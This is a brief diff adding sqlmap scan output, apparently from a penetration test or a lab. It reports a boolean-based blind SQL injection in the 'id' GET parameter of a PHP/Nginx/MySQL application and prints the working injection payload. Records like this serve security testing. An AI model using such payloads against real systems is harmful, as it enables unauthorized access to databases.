@@ -1,0 +1,9 @@
+sqlmap identified the following injection point(s) with a total of 360 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=7' AND 5949=5949 AND 'ehDE'='ehDE
+---
+web application technology: PHP, Nginx 1.25.5
+back-end DBMS: MySQL >= 5.0.0
